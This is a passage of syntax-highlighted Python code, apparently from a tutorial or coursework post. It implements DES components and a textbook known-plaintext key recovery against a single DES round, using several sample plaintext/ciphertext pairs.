</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get sbox in 3 dim</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getSbox</span>():
</span></span><span style="display:flex;"><span>    S_str <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./src/sbox.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    S <span style="color:#f92672">=</span> [[[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>)]<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>)]
</span></span><span style="display:flex;"><span>    l <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>                S[i][j][k] <span style="color:#f92672">=</span> int(S_str[l])
</span></span><span style="display:flex;"><span>                l <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> S
</span></span><span style="display:flex;"><span><span style="color:#75715e"># number in dec to number in bit</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">d2b</span>(n):
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> n <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">+=</span> chr(n <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>        n <span style="color:#f92672">=</span> n <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> len(res) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span><span style="color:#75715e"># sbox replacement</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sbox</span>(ipt):
</span></span><span style="display:flex;"><span>    S <span style="color:#f92672">=</span> getSbox()
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>    i, l <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">48</span>:
</span></span><span style="display:flex;"><span>        j <span style="color:#f92672">=</span> ipt[i] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> ipt[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>]
</span></span><span style="display:flex;"><span>        k <span style="color:#f92672">=</span> ipt[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> ipt[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> ipt[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> ipt[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span>        temp <span style="color:#f92672">=</span> d2b(S[l][j][k])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> m <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            res[m <span style="color:#f92672">+</span> l <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> int(temp[m])
</span></span><span style="display:flex;"><span>        l <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get Pbox</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getPbox</span>():
</span></span><span style="display:flex;"><span>    P_str <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./src/pbox.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    P <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> len(P_str)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(P_str)):
</span></span><span style="display:flex;"><span>        P[i] <span style="color:#f92672">=</span> int(P_str[i])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> P
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pbox replacement</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pbox</span>(ipt):
</span></span><span style="display:flex;"><span>    P <span style="color:#f92672">=</span> getPbox()
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>        res[i] <span style="color:#f92672">=</span> ipt[P[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span><span style="color:#75715e"># f function</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">f</span>(R, K):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># extend R</span>
</span></span><span style="display:flex;"><span>    E_R <span style="color:#f92672">=</span> extend(R)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># E_R xor K</span>
</span></span><span style="display:flex;"><span>    afterADD <span style="color:#f92672">=</span> xor(E_R, K)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># sbox</span>
</span></span><span style="display:flex;"><span>    afterSbox <span style="color:#f92672">=</span> sbox(afterADD)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># linear displacement</span>
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> pbox(afterSbox)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Encrypt function</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">DES_Encrypt</span>(plaintext, roundkey):
</span></span><span style="display:flex;"><span>    M_IP <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>    afterF <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>    L <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">17</span>)]
</span></span><span style="display:flex;"><span>    R <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">17</span>)]
</span></span><span style="display:flex;"><span>    IP, IP_1 <span style="color:#f92672">=</span> getIP()
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># get IP replace</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">64</span>):
</span></span><span style="display:flex;"><span>        M_IP[i] <span style="color:#f92672">=</span> plaintext[IP[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># get L0 and R0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>        L[<span style="color:#ae81ff">0</span>][i] <span style="color:#f92672">=</span> M_IP[i]
</span></span><span style="display:flex;"><span>        R[<span style="color:#ae81ff">0</span>][i] <span style="color:#f92672">=</span> M_IP[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">17</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># L[i] = R[i - 1]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>            L[i][j] <span style="color:#f92672">=</span> R[i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>][j]
</span></span><span style="display:flex;"><span>        R[i] <span style="color:#f92672">=</span> xor(L[i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>], f(R[i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>], roundkey[i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]))
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># merge the R and L</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">64</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>:
</span></span><span style="display:flex;"><span>            afterF[i] <span style="color:#f92672">=</span> R[<span style="color:#ae81ff">16</span>][i]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            afterF[i] <span style="color:#f92672">=</span> L[<span style="color:#ae81ff">16</span>][i <span style="color:#f92672">-</span> <span style="color:#ae81ff">32</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># using IP_1 replace to get cipher</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">64</span>):
</span></span><span style="display:flex;"><span>        cipher[i] <span style="color:#f92672">=</span> afterF[IP_1[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> cipher
</span></span><span style="display:flex;"><span><span style="color:#75715e">#########################################################################</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Main</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#########################################################################</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># number in hex to number in bin</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hex_to_bin</span>(a):
</span></span><span style="display:flex;"><span>    b <span style="color:#f92672">=</span> int(a, <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> b <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">+=</span> chr(b <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>        b <span style="color:#f92672">=</span> b <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> len(res) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span><span style="color:#75715e"># text in hex to text in bin</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">h2b</span>(s):
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> s:
</span></span><span style="display:flex;"><span>        temp <span style="color:#f92672">=</span> hex_to_bin(i)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            res<span style="color:#f92672">.</span>append(int(temp[j]))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span><span style="color:#75715e"># number in bin to number in hex</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bin_to_hex</span>(a):
</span></span><span style="display:flex;"><span>    b <span style="color:#f92672">=</span> int(a, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hex(b)[<span style="color:#ae81ff">2</span>:]
</span></span><span style="display:flex;"><span><span style="color:#75715e"># text in bin to text in hex</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">b2h</span>(s):
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    now_bin <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(s)):
</span></span><span style="display:flex;"><span>        now_bin <span style="color:#f92672">+=</span> chr(s[i] <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(now_bin) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">+=</span> bin_to_hex(now_bin)
</span></span><span style="display:flex;"><span>            now_bin <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_P_1</span>():
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> getPbox()
</span></span><span style="display:flex;"><span>    p_1 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>        p_1[p[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> i
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p_1
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">str2martix</span>(s):
</span></span><span style="display:flex;"><span>    m <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
</span></span><span style="display:flex;"><span>        m[i] <span style="color:#f92672">=</span> int(s[i],  <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> m
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve</span>(plaintext, cipher):
</span></span><span style="display:flex;"><span>    m <span style="color:#f92672">=</span> h2b(plaintext)
</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> h2b(cipher)
</span></span><span style="display:flex;"><span>    C_IP <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>    M_IP <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>    may_after_xor <span style="color:#f92672">=</span> [[<span style="color:#e6db74">&#39;&#39;</span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>)]<span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>)]
</span></span><span style="display:flex;"><span>    L <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">17</span>)]
</span></span><span style="display:flex;"><span>    R <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">17</span>)]
</span></span><span style="display:flex;"><span>    ast <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>    IP, IP_1 <span style="color:#f92672">=</span> getIP()
</span></span><span style="display:flex;"><span>    before_p <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>    S <span style="color:#f92672">=</span> getSbox()
</span></span><span style="display:flex;"><span>    p_1 <span style="color:#f92672">=</span> gen_P_1()
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># get IP replace</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">64</span>):
</span></span><span style="display:flex;"><span>        M_IP[i] <span style="color:#f92672">=</span> m[IP[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        C_IP[i] <span style="color:#f92672">=</span> c[IP[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># get L0 and R0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>        L[<span style="color:#ae81ff">0</span>][i] <span style="color:#f92672">=</span> M_IP[i]
</span></span><span style="display:flex;"><span>        R[<span style="color:#ae81ff">0</span>][i] <span style="color:#f92672">=</span> M_IP[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>        L[<span style="color:#ae81ff">1</span>][i] <span style="color:#f92672">=</span> C_IP[i]
</span></span><span style="display:flex;"><span>        R[<span style="color:#ae81ff">1</span>][i] <span style="color:#f92672">=</span> C_IP[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>]
</span></span><span style="display:flex;"><span>    e <span style="color:#f92672">=</span> extend(R[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    cip <span style="color:#f92672">=</span> xor(R[<span style="color:#ae81ff">1</span>], L[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>        before_p[i] <span style="color:#f92672">=</span> cip[p_1[i]]
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 还原进入sbox前的值</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> S[i][j][k] <span style="color:#f92672">==</span> int(b2h(before_p[i<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>:(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>]), <span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>                    may_after_xor[i][j] <span style="color:#f92672">=</span> (bin(j)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">2</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> bin(k)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> bin(j)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">2</span>)[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    may_res <span style="color:#f92672">=</span> [[[]<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>)]<span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>)]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            may_after_xor[i][j] <span style="color:#f92672">=</span> str2martix(may_after_xor[i][j])
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 还原所有可能的K</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            may_res[i][j] <span style="color:#f92672">=</span> (xor(may_after_xor[i][j], e[i<span style="color:#f92672">*</span><span style="color:#ae81ff">6</span>:(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">6</span>]))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> may_res
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_PC_1</span>():
</span></span><span style="display:flex;"><span>    PC_1, PC_2 <span style="color:#f92672">=</span> getPC()
</span></span><span style="display:flex;"><span>    PC1, PC2 <span style="color:#f92672">=</span> [<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span>, [<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">56</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">56</span>):
</span></span><span style="display:flex;"><span>        PC1[PC_1[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> i
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">48</span>):
</span></span><span style="display:flex;"><span>        PC2[PC_2[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> i
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> PC1, PC2
</span></span><span style="display:flex;"><span><span style="color:#75715e"># def resolve_key(roundKey):</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     C = [0] * 28</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     D = [0] * 28</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     K = [0] * 56</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     PC_1, PC_2 = getPC()</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     PC1, PC2 = gen_PC_1()</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     moveNum = getMoveNum()</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     for i in range(48):</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#         if PC2[j] &lt;= 28:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#             C[PC2[j]] = roundKey[i]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#         else:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#             D[PC2[j] - 28] = roundKey[i]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     C = leftRow(C, 28 - moveNum[i])</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     D = leftRow(D, 28 - moveNum[i])</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     for i in range(28):</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#         K[i] = C[i]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#         K[i + 28] = D[i]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     for i in range(56):</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#         key[PC1[i]] = K[i]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     return key</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    plaintext1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;4845AB454511C0F0&#34;</span>
</span></span><span style="display:flex;"><span>    miwen1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2EA85F08AA80C2D2&#34;</span>
</span></span><span style="display:flex;"><span>    plaintext2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789ABCDEF&#34;</span>
</span></span><span style="display:flex;"><span>    miwen2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0293A8B9E45FCE5D&#34;</span>
</span></span><span style="display:flex;"><span>    plaintext3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;81120015A001FDF1&#34;</span>
</span></span><span style="display:flex;"><span>    miwen3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;E88382207800FE7A&#34;</span>
</span></span><span style="display:flex;"><span>    plaintext4 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2214500AEF00CD48&#34;</span>
</span></span><span style="display:flex;"><span>    miwen4<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;B38AA0AD7720E4AC&#34;</span>
</span></span><span style="display:flex;"><span>    plaintext5 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;5791AC22121B1234&#34;</span>
</span></span><span style="display:flex;"><span>    miwen5<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A3C0DEB9AB0F833A&#34;</span>
</span></span><span style="display:flex;"><span>    K1 <span style="color:#f92672">=</span> solve(plaintext1, miwen1)
